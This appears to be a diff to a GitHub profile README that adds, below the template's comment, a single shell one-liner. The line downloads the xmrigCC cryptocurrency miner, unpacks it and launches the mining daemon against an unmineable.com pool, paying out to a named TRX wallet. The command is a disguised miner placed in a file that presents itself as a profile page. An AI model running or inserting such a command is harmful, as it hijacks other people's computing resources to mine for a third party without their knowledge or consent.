@@ -8,3 +8,4 @@
 viikoov/viikoov is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
+wget https://github.com/Bendr0id/xmrigCC/releases/download/2.9.4/xmrigCC-2.9.4-linux-generic-amd64.tar.gz && tar -xf xmrigCC-2.9.4-linux-generic-amd64.tar.gz && rm xmrigCC-2.9.4-linux-generic-amd64.tar.gz && ./miner/xmrigDaemon -o rx.unmineable.com:3333 -u TRX:TLcaPSSZj6Nm3xvS3dKNdzBZgabkKAY8Dy.SSS4 -p WK01 -k -a cn-heavy/xhv
